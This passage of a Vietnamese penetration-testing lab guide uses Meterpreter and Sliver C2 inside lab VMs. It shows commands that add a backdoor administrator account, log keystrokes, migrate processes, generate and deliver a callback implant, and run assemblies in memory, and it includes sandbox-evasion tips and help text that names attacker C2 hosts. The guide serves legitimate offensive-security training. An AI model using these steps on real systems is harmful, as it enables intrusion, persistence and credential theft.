Bây giờ chúng ta hãy cùng khám phá một số lệnh để tương tác với hệ thống tập tin. Đầu tiên, chúng ta sẽ điều hướng đến thư mục `c:\`. Lưu ý rằng trong Meterpreter, bạn phải sử dụng dấu gạch chéo (`/`) để tham chiếu đến đường dẫn thư mục hoặc sử dụng chuỗi thoát của dấu gạch chéo ngược (`\`) để chỉ ra dấu gạch chéo ngược (`\\`). Vì vậy, để chuyển đến `c:\` thư mục, vui lòng chạy lệnh:

```bash
cd c:\\
```

Lưu ý rằng trong Meterpreter, bạn cũng có thể tham chiếu đến `c:\` như `/`. Vì vậy, các lệnh cd `c:\\` và `cd /` thực hiện cùng một việc.

Tiếp theo, hãy cùng tìm hiểu xem chúng ta đang ở đâu trong cấu trúc thư mục. (Vì chúng ta vừa chuyển đến `c:\`, nên chúng ta sẽ ở đó). Lệnh cụ thể phụ thuộc vào phiên bản Meterpreter bạn đang sử dụng. Đối với một số phiên bản Meterpreter, lệnh là `pwd`. Đối với các phiên bản khác, lệnh là `getcwd`. Hãy chạy một trong hai lệnh đó. Một hoặc cả hai lệnh đều có thể hoạt động:

```bash
pwd
```

![alt text](IMG/LAB2/LAB2.2/image-22.png)

Bây giờ chúng ta hãy lấy danh sách thư mục:

```bash
ls  
```

![alt text](IMG/LAB2/LAB2.2/image-23.png)

### 5. Shell

Đôi khi, những gì chúng ta muốn thực hiện trên một mục tiêu sẽ dễ dàng hơn nếu sử dụng một trình shell đơn giản của Windows, chẳng hạn như cmd.exe, hơn là sử dụng Meterpreter. Để hỗ trợ kiểu truy cập đó, Meterpreter bao gồm lệnh shell, lệnh này thực thi cmd.exe. Bạn có thể thấy tính năng tiện lợi này bằng cách thực thi lệnh shell từ bên trong dấu nhắc của Meterpreter:

```bash
shell
```

![alt text](IMG/LAB2/LAB2.2/image-24.png)

Giờ đây bạn có thể nhập bất kỳ lệnh nào bạn muốn vào cửa sổ cmd.exe.

Chạy `hostname`.

```bash
hostname
```

![alt text](IMG/LAB2/LAB2.2/image-25.png)

Chạy `ipconfig`.

```bash
ipconfig
```

![alt text](IMG/LAB2/LAB2.2/image-26.png)

Chạy `dir`:

```bash
dir
```

![alt text](IMG/LAB2/LAB2.2/image-27.png)

Bây giờ chúng ta hãy xem xét những người dùng trên hệ thống.

```bash
net user
```

![alt text](IMG/LAB2/LAB2.2/image-28.png)

Tạo một tài khoản cửa sau có tên là `BACKDOOR`.

```bash
net user BACKDOOR Password1 /add
```

![alt text](IMG/LAB2/LAB2.2/image-29.png)

Lệnh trên tạo một người dùng với mật khẩu là Password1.

Bây giờ chúng ta hãy xác nhận xem người dùng có tồn tại hay không.

```bash
net user BACKDOOR
```

![alt text](IMG/LAB2/LAB2.2/image-30.png)

Tài khoản BACKDOOR mới là một tài khoản thông thường. Sẽ hữu ích hơn nếu nó có quyền quản trị. Hãy cấp quyền quản trị cho tài khoản này.

```bash
net localgroup administrators BACKDOOR /add
```

![alt text](IMG/LAB2/LAB2.2/image-31.png)

Bây giờ, hãy xem danh sách thành viên của nhóm quản trị viên để xác nhận xem tài khoản cửa sau có phải là quản trị viên hay không.

```bash
net localgroup administrators
```

![alt text](IMG/LAB2/LAB2.2/image-32.png)

Như chúng ta thấy, tài khoản mới của chúng ta là tài khoản quản trị viên!

Hãy xóa tài khoản này.

```bash
net user BACKDOOR /del
```

![alt text](IMG/LAB2/LAB2.2/image-33.png)

Chúng ta có thể xác nhận việc xóa bằng cách chạy `net user` lại lệnh. Vì lý do tiết kiệm không gian, kết quả đầu ra không được đưa vào đây.

Để thoát khỏi cửa sổ dòng lệnh, chỉ cần gõ `exit`, và bạn sẽ quay lại dấu nhắc lệnh `meterpreter >`:

![alt text](IMG/LAB2/LAB2.2/image-34.png)

### 6. Các tính năng khác của Meterpreter

Tiếp theo, chụp ảnh màn hình hệ thống bị khai thác và lưu lại với tên `/tmp/screen.jpg`:

![alt text](IMG/LAB2/LAB2.2/image-35.png)

Meterpreter sẽ chụp ảnh màn hình, quá trình này có thể mất vài giây.

Tiếp theo, khởi chạy trình duyệt Firefox trong máy ảo Linux của bạn (bằng cách nhấp vào biểu tượng của nó trên thanh công cụ phía trên). Trong Firefox, hãy truy cập vào vị trí của:

```bash
file:///tmp/screen.jpg
```

![alt text](IMG/LAB2/LAB2.2/image-36.png)

Bây giờ chúng ta sẽ di chuyển DLL Meterpreter trên máy bị khai thác từ một tiến trình này sang tiến trình khác. Chúng ta sẽ chuyển từ tiến trình `Icecast2.exe` sang tiến trình `explorer.exe` trên máy Windows của mình. Chúng ta sử dụng Explorer vì nó sẽ tiếp tục chạy miễn là người dùng vẫn đăng nhập.

Tiếp theo, quay lại Meterpreter và lấy số ID của tiến trình hiện tại.

```bash
getpid
```

Bây giờ, hãy lấy danh sách các tiến trình để tìm ID tiến trình của Explorer. Chúng ta có thể sử dụng lệnh `ps` với tùy chọn `-S` (chữ S viết hoa) để tìm kiếm.

```bash
ps -S explorer.exe
```

![alt text](IMG/LAB2/LAB2.2/image-37.png)

Chúng ta có thể nhảy đến tiến trình explorer.exe bằng ID tiến trình, hoặc chúng ta có thể chỉ định tên bằng -Ntùy chọn.

Tiếp theo, để bắt đầu quá trình đó, chúng ta sử dụng lệnh `migrate` với số ID tiến trình đã nêu ở trên.

```bash
migrate -N explorer.exe
```

![alt text](IMG/LAB2/LAB2.2/image-38.png)

> Nếu quá trình di chuyển thất bại (nhấp để mở rộng)
> Nếu quá trình chuyển đổi của bạn thất bại (và điều này rất có thể xảy ra), bạn sẽ phải thiết lập lại phiên Meterpreter. Trước tiên, hãy tắt phiên hiện tại bằng cách gõ lệnh `exit`. Sau đó, đảm bảo Icecast đang chạy và chỉ cần gõ lại lệnh `run`.

```bash
getpid
```

Đó phải là số được liên kết với `explorer.exe`. Nếu vậy, bạn vừa chuyển đổi giữa các tiến trình. Quá trình chuyển đổi có thể gặp lỗi. Nếu tiến trình mục tiêu bị sập, điều đó không sao. Bạn có thể khai thác lại hệ thống mục tiêu bằng cách thoát khỏi phiên Meterpreter đã chết của mình bằng lệnh `CTRL-C` hoặc `exit`. Sau đó khởi động lại Icecast. Tại dấu nhắc `msf >`, chạy lại lệnh `run`.

### 7. Keystroke Logging

Khởi chạy Notepad trong máy ảo Windows của bạn (không phải thông qua Meterpreter). Trong giao diện đồ họa, nhấp vào menu Bắt đầu, gõ "notepad", sau đó khởi chạy.

Quay lại máy ảo Linux và phiên meterpreter của bạn rồi chạy lệnh đó `keyscan_start`.

![alt text](IMG/LAB2/LAB2.2/image-39.png)

Tiếp theo, trong Windows, hãy nhập một vài đoạn văn bản vào Notepad. Viết một ghi chú về mật khẩu của bạn, ví dụ như `my password is TungDvan dep trai`.

![alt text](IMG/LAB2/LAB2.2/image-40.png)

Bây giờ hãy quay lại Meterpreter và xuất các thao tác gõ phím đã thu được ra màn hình.

```bash
keyscan_dump
```

![alt text](IMG/LAB2/LAB2.2/image-41.png)

Sau đó hãy dừng phần mềm ghi lại thao tác gõ phím:

```bash
keyscan_stop
```

![alt text](IMG/LAB2/LAB2.2/image-42.png)

```bash
exit
```

Để hoàn tất bài thực hành, hãy tắt Notepad trên Windows. Sau đó, hãy dừng Icecast.

## Phần kết luận

Trong bài thực hành này, chúng ta đã thấy một lỗ hổng bảo mật phía máy chủ được khai thác nhắm vào một dịch vụ lắng nghe dễ bị tổn thương. Bằng cách khai thác lỗ hổng đó bằng Metasploit, chúng ta đã có thể tải payload Meterpreter với stager reverse_http vào bộ nhớ của máy mục tiêu. Sau đó, chúng ta đã khám phá nhiều tính năng của Meterpreter, bao gồm khả năng khám phá hệ thống tập tin, chạy các chương trình (chẳng hạn như `shell`), cung cấp các kênh liên lạc giữa Đầu vào Chuẩn và Đầu ra Chuẩn của chương trình, chụp ảnh màn hình, di chuyển các tiến trình và ghi nhật ký các thao tác gõ phím. Thực sự, Meterpreter là một thành phần payload rất mạnh mẽ trong kho vũ khí của chuyên gia kiểm thử xâm nhập.

# Lab 2.3. Sliver

## Mục tiêu

Để làm quen với Sliver và các khả năng của nó

Để thiết lập chế độ chơi nhiều người và làm quen với các tính năng của chế độ này.

Để tạo trình lắng nghe và tạo payloads để kết nối với trình lắng nghe.

Để sử dụng một số khả năng của thiết bị cấy ghép Sliver, cụ thể là khả năng thực thi lắp ráp.

## Thiết lập phòng thí nghiệm

Các máy ảo được sử dụng:

- Slingshot Linux

- Windows 10

Để thực hiện bài thực hành này, hãy đảm bảo bạn có thể ping từ máy ảo Slingshot Linux đến máy ảo Windows và ngược lại.

```bash
ping WINDOWS_ETHERNET0_ADDRESS
# Thay thế WINDOWS_ETHERNET0_ADDRESSbằng địa chỉ cục bộ của máy ảo Windows của bạn (KHÔNG phải địa chỉ dạng như 10.254.25X.X).
```

```bash
ping LINUX_ETH0_ADDRESS
# Thay thế LINUX_ETH0_ADDRESSbằng địa chỉ của giao diện eth0 trên máy ảo Linux của bạn (KHÔNG phải địa chỉ như 10.254.25X.Xtrên tun0).
```

## Hướng dẫn thực hành từng bước

### 1. Bắt đầu Sliver

Xóa toàn bộ dữ liệu Sliver (Vì bài LAB này CA đã cấp từ lâu nên bị hết hạn, chúng ta sẽ xóa hết đê cấp lại CA mới):

```bash
rm -rf ~/.sliver
```

Sliver gồm hai thành phần, máy khách và máy chủ. Đầu tiên, hãy khởi động máy chủ trong máy ảo Slingshot của bạn.

```bash
sudo sliver-server
```

Bạn có thể điều khiển mọi thứ từ đây, nhưng trước tiên hãy thiết lập chế độ chơi nhiều người.

Đến bước này, bạn sẽ thấy một thông báo nhắc nhở có dạng như sau:

```bash
[server] sliver >
```

Hãy xem phần trợ giúp.

```bash
help
```

```bash
[server] sliver > help

Commands:
=========
  clear       clear the screen
  exit        exit the shell
  help        use 'help [command]' for command help
  monitor     Monitor threat intel platforms for Sliver implants
  wg-config   Generate a new WireGuard client config
  wg-portfwd  List ports forwarded by the WireGuard tun interface
  wg-socks    List socks servers listening on the WireGuard tun interface


Generic:
========
  aliases           List current aliases
  armory            Automatically download and install extensions/aliases
  background        Background an active session
  beacons           Manage beacons
  builders          List external builders
  canaries          List previously generated canaries
  cursed            Chrome/electron post-exploitation tool kit (∩｀-´)⊃━☆ﾟ.*･｡ﾟ
  dns               Start a DNS listener
  env               List environment variables
  generate          Generate an implant binary
  hosts             Manage the database of hosts
  http              Start an HTTP listener
  https             Start an HTTPS listener
  implants          List implant builds
  jobs              Job control
  licenses          Open source licenses
  loot              Manage the server's loot store
  mtls              Start an mTLS listener
  prelude-operator  Manage connection to Prelude's Operator
  profiles          List existing profiles
  reaction          Manage automatic reactions to events
  regenerate        Regenerate an implant
  sessions          Session management
  settings          Manage client settings
  stage-listener    Start a stager listener
  tasks             Beacon task management
  update            Check for updates
  use               Switch the active session or beacon
  version           Display version information
  websites          Host static content (used with HTTP C2)
  wg                Start a WireGuard listener


Multiplayer:
============
  kick-operator  Kick an operator from the server
  multiplayer    Enable multiplayer mode
  new-operator   Create a new operator config file
  operators      Manage operators


For even more information, please see our wiki: https://github.com/BishopFox/sliver/wiki
```

Hầu hết các lệnh chúng ta cần xem xét đều nằm trong danh mục Chung. Danh mục Nhiều người chơi chỉ khả dụng trên máy chủ. Nó cho phép bạn cấu hình và thêm người dùng mới (người điều hành hoặc người chơi) để có thể làm việc cùng nhau như một nhóm.

Hãy cấu hình chế độ nhiều người chơi và sau đó kết nối với tư cách là máy khách. Trước tiên, chúng ta cần bật chế độ nhiều người chơi bằng cách chạy lệnh `multiplayer`.

```bash
multiplayer
```

Kết quả: 

```bash
[server] sliver > multiplayer

[*] Multiplayer mode enabled!

[server] sliver >
```

Các tùy chọn chơi nhiều người chỉ khả dụng trên máy chủ, không có trên bất kỳ máy khách nào.

Vì chúng ta đang chạy trên máy chủ, nên chúng ta có thể kết nối dễ dàng chỉ bằng cách chạy ứng dụng khách. Thay vào đó, chúng ta sẽ tạo một người dùng và kết nối bằng chứng chỉ để mô phỏng việc có nhiều người cùng sử dụng hệ thống.

Trước tiên, chúng ta cần biết các tùy chọn để tạo người chơi mới. Hãy chạy lệnh `new-operator -h` này để xem hướng dẫn.

```bash
new-operator -h
```

![alt text](IMG/LAB2/LAB2.3/image.png)

Hãy tạo một người dùng mới. Chúng ta sẽ sử dụng tên `tungdvan1`, nhưng bạn có thể sử dụng tên người dùng ưa thích của mình. Đối với địa chỉ IP, hãy sử dụng địa chỉ của giao diện tun0 (`10.254.25X.X`).

```bash
new-operator -n tungdvan1 -s /tmp/ -l 10.130.10.128
```

![alt text](IMG/LAB2/LAB2.3/image-1.png)

Mở một cửa sổ terminal mới rồi thực hiện các bước sau.

Bạn có thể chia sẻ tập tin này `cfg` với người chơi mới. Nếu muốn thử, hãy tạo một người chơi mới và chia sẻ tập tin với người kia (trong lớp học trực tuyến, bạn có thể làm điều này qua Slack). Chúng tôi khuyên bạn nên thực hiện việc này trong cuộc thi CTF cuối khóa nếu bạn đang làm việc nhóm. Trong TH này minh sẽ tạo thêm một máy ảo sec560 với địa chỉ IP là `10.130.10.129`.

Kiểm tra tệp cấu hình bằng lệnh ls -l.

```bash
ls -l /tmp/*.cfg
```

![alt text](IMG/LAB2/LAB2.3/image-2.png)

Chúng ta đã chạy máy chủ với quyền root để nó có thể lắng nghe trên cổng TCP 443. Điều này cũng có nghĩa là bất kỳ tệp nào được tạo bởi tiến trình này cũng sẽ thuộc sở hữu của root. Tệp này thậm chí còn bị hạn chế quyền truy cập hơn nữa, chỉ chủ sở hữu (root) mới có thể đọc được. Chúng ta cần thay đổi quyền truy cập của tệp để có thể đọc được nó.

```bash
sudo chown sec560:sec560 /tmp/*.cfg
```

Chúng ta hãy thực hành quy trình nhập khẩu trên hệ thống cục bộ của mình. Trước tiên, chúng ta sẽ xem xét các tùy chọn với sliver-client.

```bash
sliver-client -h
```

![alt text](IMG/LAB2/LAB2.3/image-3.png)

Nhập tệp cấu hình bằng lệnh phụ `import`.

```bash
sliver-client import /tmp/tungdvan1_10.130.10.128.cfg
```

![alt text](IMG/LAB2/LAB2.3/image-5.png)

Giờ chúng ta có thể kết nối với máy chủ. Chạy lệnh `sliver-client`.

```bash
sliver-client
```

![alt text](IMG/LAB2/LAB2.3/image-6.png)

Sau khi chọn đúng người dùng và nhấn Enter, bạn sẽ thấy lời nhắc `sliver >`. Hãy chú ý cửa sổ terminal trên máy chủ của bạn, nó sẽ hiển thị `[*] tungdvan1 has joined the game`.

![alt text](IMG/LAB2/LAB2.3/image-7.png)

### 2. Tạo Listener và Payload Implant

Chạy lệnh này trên máy khách (`sliver >`) chứ KHÔNG phải trên máy chủ (`[server] sliver >`).

Chúng ta hãy bắt đầu bằng cách tạo một trình lắng nghe https.

```bash
https -h
```

![alt text](IMG/LAB2/LAB2.3/image-8.png)

Trong thực tế, chúng ta sẽ thiết lập chứng chỉ (hoặc chứng chỉ Let's Encrypt) và tạo tên miền. Hiện tại, chúng ta chỉ sử dụng địa chỉ IP.

Chúng ta hãy bắt đầu với một trình lắng nghe https đơn giản.

```bash
https
```

![alt text](IMG/LAB2/LAB2.3/image-9.png)

Hãy để ý rằng nó đã nói như vậy `job #2`. Chúng ta hãy cùng xem xét các công việc.

```bash
jobs
```

![alt text](IMG/LAB2/LAB2.3/image-10.png)

Công việc đầu tiên chạy trên cổng 31337 là dành cho người dùng từ xa (multiplayer). Chúng tôi cũng có trình lắng nghe https đang chạy trên cổng mặc định 443.

Giờ chúng ta đã cấu hình xong trình lắng nghe để nhận kết nối. Hãy cùng xem cách xây dựng dữ liệu gửi đi.

```bash
generate -h
```

```bash
Command: generate <options>
About: Generate a new sliver binary and saves the output to the cwd or a path specified with --save.

++ Command and Control ++
You must specificy at least one c2 endpoint when generating an implant, this can be one or more of --mtls, --wg, --http, or --dns, --named-pipe, or --tcp-pivot.
The command requires at least one use of --mtls, --wg, --http, or --dns, --named-pipe, or --tcp-pivot.

The follow command is used to generate a sliver Windows executable (PE) file, that will connect back to the server using mutual-TLS:
        generate --mtls foo.example.com

The follow command is used to generate a sliver Windows executable (PE) file, that will connect back to the server using Wireguard on UDP port 9090,
then connect to TCP port 1337 on the server's virtual tunnel interface to retrieve new wireguard keys, re-establish the wireguard connection using the new keys,
then connect to TCP port 8888 on the server's virtual tunnel interface to establish c2 comms.
        generate --wg 3.3.3.3:9090 --key-exchange 1337 --tcp-comms 8888

You can also stack the C2 configuration with multiple protocols:
        generate --os linux --mtls example.com,domain.com --http bar1.evil.com,bar2.attacker.com --dns baz.bishopfox.com


++ Formats ++
Supported output formats are Windows PE, Windows DLL, Windows Shellcode, Mach-O, and ELF. The output format is controlled
with the --os and --format flags.

To output a 64bit Windows PE file (defaults to WinPE/64bit), either of the following command would be used:
        generate --mtls foo.example.com
        generate --os windows --arch 64bit --mtls foo.example.com

A Windows DLL can be generated with the following command:
        generate --format shared --mtls foo.example.com

To output a MacOS Mach-O executable file, the following command would be used
        generate --os mac --mtls foo.example.com

To output a Linux ELF executable file, the following command would be used:
        generate --os linux --mtls foo.example.com


++ DNS Canaries ++
DNS canaries are unique per-binary domains that are deliberately NOT obfuscated during the compilation process.
This is done so that these unique domains show up if someone runs 'strings' on the binary, if they then attempt
to probe the endpoint or otherwise resolve the domain you'll be alerted that your implant has been discovered,
and which implant file was discovered along with any affected sessions.

Important: You must have a DNS listener/server running to detect the DNS queries (see the "dns" command).

Unique canary subdomains are automatically generated and inserted using the --canary flag. You can view previously generated
canaries and their status using the "canaries" command:
        generate --mtls foo.example.com --canary 1.foobar.com

++ Execution Limits ++
Execution limits can be used to restrict the execution of a Sliver implant to machines with specific configurations.

++ Profiles ++
Due to the large number of options and C2s this can be a lot of typing. If you'd like to have a reusable a Sliver config
see 'help profiles new'. All "generate" flags can be saved into a profile, you can view existing profiles with the "profiles"
command.


Usage:
======
  generate [flags]

Flags:
======
  -a, --arch               string    cpu architecture (default: amd64)
  -c, --canary             string    canary domain(s)
  -d, --debug                        enable debug features
  -O, --debug-file         string    path to debug output
  -G, --disable-sgn                  disable shikata ga nai shellcode encoder
  -n, --dns                string    dns connection strings
  -e, --evasion                      enable evasion features (e.g. overwrite user space hooks)
  -E, --external-builder             use an external builder
  -f, --format             string    Specifies the output formats, valid values are: 'exe', 'shared' (for dynamic libraries), 'service' (see `psexec` for more info) and 'shellcode' (windows only) (default: exe)
  -h, --help                         display help
  -b, --http               string    http(s) connection strings
  -X, --key-exchange       int       wg key-exchange port (default: 1337)
  -w, --limit-datetime     string    limit execution to before datetime
  -x, --limit-domainjoined           limit execution to domain joined machines
  -F, --limit-fileexists   string    limit execution to hosts with this file in the filesystem
  -z, --limit-hostname     string    limit execution to specified hostname
  -L, --limit-locale       string    limit execution to hosts that match this locale
  -y, --limit-username     string    limit execution to specified username
  -k, --max-errors         int       max number of connection errors (default: 1000)
  -m, --mtls               string    mtls connection strings
  -N, --name               string    agent name
  -p, --named-pipe         string    named-pipe connection strings
  -o, --os                 string    operating system (default: windows)
  -P, --poll-timeout       int       long poll request timeout (default: 360)
  -j, --reconnect          int       attempt to reconnect every n second(s) (default: 60)
  -R, --run-at-load                  run the implant entrypoint from DllMain/Constructor (shared library only)
  -s, --save               string    directory/file to the binary to
  -l, --skip-symbols                 skip symbol obfuscation
  -Z, --strategy           string    specify a connection strategy (r = random, rd = random domain, s = sequential)
  -T, --tcp-comms          int       wg c2 comms port (default: 8888)
  -i, --tcp-pivot          string    tcp-pivot connection strings
  -I, --template           string    implant code template (default: sliver)
  -t, --timeout            int       command timeout in seconds (default: 60)
  -g, --wg                 string    wg connection strings

Sub Commands:
=============
  beacon  Generate a beacon binary
  info    Get information about the server's compiler
  stager  Generate a stager using Metasploit (requires local Metasploit installation)
```

Có một vài biện pháp bảo vệ thú vị mà chúng ta có thể sử dụng để cố gắng vượt qua công nghệ hộp cát. Hãy cùng xem xét một vài trong số đó:

- `-w, --limit-datetime`: giới hạn việc thực thi trước thời điểm datetime (tương tự như KillDate trong Empire).

- `-x, --limit-domainjoined`: giới hạn việc thực thi chỉ trên các máy đã tham gia miền.

- `-F, --limit-fileexists`: giới hạn việc thực thi chỉ trên các máy chủ có tệp này trong hệ thống tệp

- `-z, --limit-hostname`: giới hạn việc thực thi chỉ trên tên máy chủ được chỉ định

- `-y, --limit-username`: giới hạn quyền thực thi cho người dùng được chỉ định

Chúng ta sẽ không sử dụng các tùy chọn này, nhưng `-x`, `--limit-domainjoined` là một lựa chọn tốt để vượt qua các biện pháp phòng thủ sandbox đơn giản.

Chúng ta cũng có thể chỉ định một miền "canary" (`-c`, `--canary`). Miền canary được bao gồm trong tệp thực thi, nhưng không được sử dụng cho máy chủ điều khiển (C2). Nó được bao gồm để nếu mục tiêu truy vấn miền đó, bạn có thể biết được rằng ai đó đang nghiên cứu miền đó. Chúng ta sẽ bỏ qua tính năng đó vào lúc này.

Sliver thực hiện mã hóa và làm mờ dữ liệu rất phức tạp. Đây là một tính năng tuyệt vời, nhưng việc tạo ra dữ liệu có thể mất khá nhiều thời gian. Để tăng tốc quá trình thực hành, chúng tôi thường sử dụng `--skip-symbols` để bỏ qua bước này. Tuy nhiên, trong thực tế, bạn sẽ không muốn sử dụng tùy chọn này.

Hãy xây dựng một payload dành cho Windows để kết nối trở lại với listener của chúng ta. Chúng ta cần chỉ định listener và hệ điều hành.

Lệnh này có thể mất đến một phút để tạo ra dữ liệu.

```bash
generate --os windows --skip-symbols --name first2 --http 10.130.10.128
# Thay thế LINUX_ETH0_ADDRESS bằng địa chỉ của giao diện eth0 trên máy ảo Linux của bạn.
# Địa chỉ máy Server
```

![alt text](IMG/LAB2/LAB2.3/image-11.png)

![alt text](IMG/LAB2/LAB2.3/image-12.png)

Chuyển tệp sang `/home/sec560/`:

```bash
sudo cp /tmp/first2.exe /home/sec560/
```

Hãy cùng xem xét thiết bị cấy ghép mà chúng ta vừa tạo ra.

```bash
implants
```

![alt text](IMG/LAB2/LAB2.3/image-16.png)

### 3. Gửi Payload đến hệ thống Windows

Mở một cửa sổ terminal mới để chúng ta có thể tạo một máy chủ gửi dữ liệu đến hệ thống Windows của mình.

Hãy sử dụng Python để phục vụ tập tin này.

```bash
python3 -m http.server
```

![alt text](IMG/LAB2/LAB2.3/image-14.png)

Chuyển sang máy chủ Windows của bạn và mở PowerShell. Di chuyển đến màn hình nền và tải xuống tệp.

```bash
cd Desktop
wget http://10.130.10.129:8000/first2.exe -OutFile first.exe
```

Trong PowerShell, hãy xác nhận xem tệp đã được sao chép thành công hay chưa.

```bash
ls first2.exe
```

![alt text](IMG/LAB2/LAB2.3/image-15.png)

Tệp tin này có dung lượng khoảng 9MB.

### 4. Thực thi Payload

Trên hệ thống Windows của bạn, hãy nhấp đúp first.exevào màn hình Desktop.

Trên máy chủ Sliver của bạn, bạn sẽ thấy một kết nối được thiết lập.

![alt text](IMG/LAB2/LAB2.3/image-17.png)

Hãy xem phiên làm việc với `sessions`.

```bash
sessions
```

![alt text](IMG/LAB2/LAB2.3/image-18.png)

Hãy tương tác với phiên bằng cách sử dụng usevà hai ký tự đầu tiên của ID phiên. Trong ví dụ này là 79, nhưng ID của bạn sẽ khác.

```bash
use 79
```

![alt text](IMG/LAB2/LAB2.3/image-19.png)

Chúng ta đang trong phiên làm việc.

### 5. Tương tác với Session

Hãy cùng xem các tùy chọn có sẵn trong phiên làm việc của chúng ta bằng cách chạy lệnh này help.

```bash
help
```

```bash
[server] sliver (first2) > help

Commands:
=========
  clear       clear the screen
  exit        exit the shell
  help        use 'help [command]' for command help
  monitor     Monitor threat intel platforms for Sliver implants
  wg-config   Generate a new WireGuard client config
  wg-portfwd  List ports forwarded by the WireGuard tun interface
  wg-socks    List socks servers listening on the WireGuard tun interface


Generic:
========
  aliases           List current aliases
  armory            Automatically download and install extensions/aliases
  background        Background an active session
  beacons           Manage beacons
  builders          List external builders
  canaries          List previously generated canaries
  cursed            Chrome/electron post-exploitation tool kit (∩｀-´)⊃━☆ﾟ.*･｡ﾟ
  dns               Start a DNS listener
  env               List environment variables
  generate          Generate an implant binary
  hosts             Manage the database of hosts
  http              Start an HTTP listener
  https             Start an HTTPS listener
  implants          List implant builds
  jobs              Job control
  licenses          Open source licenses
  loot              Manage the server's loot store
  mtls              Start an mTLS listener
  prelude-operator  Manage connection to Prelude's Operator
  profiles          List existing profiles
  reaction          Manage automatic reactions to events
  regenerate        Regenerate an implant
  sessions          Session management
  settings          Manage client settings
  stage-listener    Start a stager listener
  tasks             Beacon task management
  update            Check for updates
  use               Switch the active session or beacon
  version           Display version information
  websites          Host static content (used with HTTP C2)
  wg                Start a WireGuard listener


Multiplayer:
============
  kick-operator  Kick an operator from the server
  multiplayer    Enable multiplayer mode
  new-operator   Create a new operator config file
  operators      Manage operators


Sliver - Windows:
=================
  backdoor          Infect a remote file with a sliver shellcode
  dllhijack         Plant a DLL for a hijack scenario
  execute-assembly  Loads and executes a .NET assembly in a child process (Windows Only)
  getprivs          Get current privileges (Windows only)
  getsystem         Spawns a new sliver session as the NT AUTHORITY\SYSTEM user (Windows Only)
  impersonate       Impersonate a logged in user.
  make-token        Create a new Logon Session with the specified credentials
  migrate           Migrate into a remote process
  psexec            Start a sliver service on a remote target
  registry          Windows registry operations
  rev2self          Revert to self: lose stolen Windows token
  runas             Run a new process in the context of the designated user (Windows Only)
  spawndll          Load and execute a Reflective DLL in a remote process


Sliver:
=======
  cat                Dump file to stdout
  cd                 Change directory
  chmod              Change permissions on a file or directory
  chown              Change owner on a file or directory
  chtimes            Change access and modification times on a file (timestomp)
  close              Close an interactive session without killing the remote process
  download           Download a file
  execute            Execute a program on the remote system
  execute-shellcode  Executes the given shellcode in the sliver process
  extensions         Manage extensions
  getgid             Get session process GID
  getpid             Get session pid
  getuid             Get session process UID
  ifconfig           View network interface configurations
  info               Get info about session
  interactive        Task a beacon to open an interactive session (Beacon only)
  kill               Kill a session
  ls                 List current directory
  mkdir              Make a directory
  msf                Execute an MSF payload in the current process
  msf-inject         Inject an MSF payload into a process
  mv                 Move or rename a file
  netstat            Print network connection information
  ping               Send round trip message to implant (does not use ICMP)
  pivots             List pivots for active session
  portfwd            In-band TCP port forwarding
  procdump           Dump process memory
  ps                 List remote processes
  pwd                Print working directory
  reconfig           Reconfigure the active beacon/session
  rename             Rename the active beacon/session
  rm                 Remove a file or directory
  rportfwd           reverse port forwardings
  screenshot         Take a screenshot
  shell              Start an interactive shell
  shikata-ga-nai     Polymorphic binary shellcode encoder (ノ ゜Д゜)ノ ︵ 仕方がない
  sideload           Load and execute a shared object (shared library/DLL) in a remote process
  socks5             In-band SOCKS5 Proxy
  ssh                Run a SSH command on a remote host
  terminate          Terminate a process on the remote system
  upload             Upload a file
  whoami             Get session user execution context


For even more information, please see our wiki: https://github.com/BishopFox/sliver/wiki
```

Các lệnh thú vị nhất sẽ nằm trong các danh mục `Sliver - Windows` và `Sliver`.

Trước tiên, hãy tìm hiểu một số thông tin về hệ thống bị xâm nhập.

```bash
getuid
getgid
```

![alt text](IMG/LAB2/LAB2.3/image-20.png)

Các lệnh `getuid` và `getgid` trả về SID của người dùng và nhóm tương ứng. Thông tin này không thực sự hữu ích. Lệnh `whoami` tốt hơn nhiều.

![alt text](IMG/LAB2/LAB2.3/image-21.png)

Nếu bạn muốn có tất cả thông tin này (và nhiều hơn nữa) chỉ với một lệnh duy nhất, hãy chạy lệnh `info`.

```bash
info
```

![alt text](IMG/LAB2/LAB2.3/image-22.png)

Ở đây chúng ta thấy thông tin về người dùng hiện tại và chi tiết về máy chủ.

### 6. Shell

Tương tự như Metasploit, chúng ta có thể truy cập vào giao diện dòng lệnh bằng lệnh `shell` này.

```bash
shell
```

![alt text](IMG/LAB2/LAB2.3/image-23.png)

> Khi chạy chương trình, shellbạn sẽ nhận được thông báo rằng đây là hành vi xâm phạm an ninh mạng (OPSEC) nghiêm trọng. Các công cụ phòng thủ được tinh chỉnh để tìm kiếm các tiến trình tạo ra các công cụ thường được các tác nhân độc hại sử dụng, chẳng hạn như CMD và PowerShell.

Như bạn thấy, giờ chúng ta đã có một cửa sổ nhắc lệnh PowerShell tương tác. Chúng ta có thể chạy bất kỳ lệnh PowerShell nào. Chạy lệnh `ls c:\` để xem thư mục gốc của ổ đĩa.

```bash
ls c:\
```

![alt text](IMG/LAB2/LAB2.3/image-24.png)

Thoát khỏi cửa sổ dòng lệnh này bằng cách gõ `exit`. Chúng ta sẽ thử một số công cụ khác để tìm hiểu về các hệ thống khác.

![alt text](IMG/LAB2/LAB2.3/image-25.png)

### 7. Thực thi Assembly - SharpWMI

Chúng ta sẽ sử dụng một assembly khác như vậy ở cuối phần 2, `Seatbelt! GhostPack` cũng bao gồm các assembly khác. Chúng ta sẽ sử dụng SharpWMI. Để làm điều này, chúng ta cần sử dụng lệnh execute-assemblyvà cung cấp đường dẫn đến SharpWMI.exe trên hệ thống Linux của mình.

```bash
execute-assembly /home/sec560/labs/SharpWMI.exe
```

![alt text](IMG/LAB2/LAB2.3/image-26.png)

Bạn nên xem phần trợ giúp của SharpWMI.

Sliver đã chuyển tập tin và thực thi nó trong bộ nhớ. Vì tập tin không bao giờ được ghi vào ổ đĩa, nên các công cụ phòng thủ sẽ khó phát hiện việc thực thi hơn.

Hãy thử nghiệm bằng cách chạy thao tác `loggedon` để lấy danh sách người dùng đã đăng nhập.

![alt text](IMG/LAB2/LAB2.3/image-27.png)

> Bạn phải nhập đúng kiểu chữ hoa chữ thường như trên. Linux có hệ thống tập tin phân biệt chữ hoa chữ thường (không giống như Windows).

Chúng ta có thể thấy `SEC560STUDENT\sec560` người dùng cục bộ trên máy ảo Windows của mình. Chúng ta cũng có thể sử dụng điều này để nhắm mục tiêu vào các hệ thống khác. Chúng ta sẽ làm điều này sau trong một bài thực hành về chuyển hướng tấn công!

